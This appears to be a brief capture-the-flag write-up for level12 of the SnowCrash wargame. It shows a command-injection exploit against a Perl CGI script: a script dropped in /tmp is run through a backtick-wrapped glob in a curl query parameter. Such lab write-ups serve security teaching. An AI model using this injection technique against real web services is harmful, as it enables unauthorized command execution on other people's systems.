# level12

Perl CGI script with partially sanitized inputs
```bash
level12@SnowCrash:~ $ printf '#!/bin/bash\n\
> getflag > /tmp/glag\n' > /tmp/GONK; \
> chmod +x /tmp/GONK; \
> curl localhost:4646/level12.pl?x=\`/*/gonk\`
#OUTPUT
level12@SnowCrash:~ $ su flag12
Password:
flag12@SnowCrash:~ $ getflag
level12@SnowCrash:~ $ su level13
Password
level13@SnowCrash:~ $ 
```
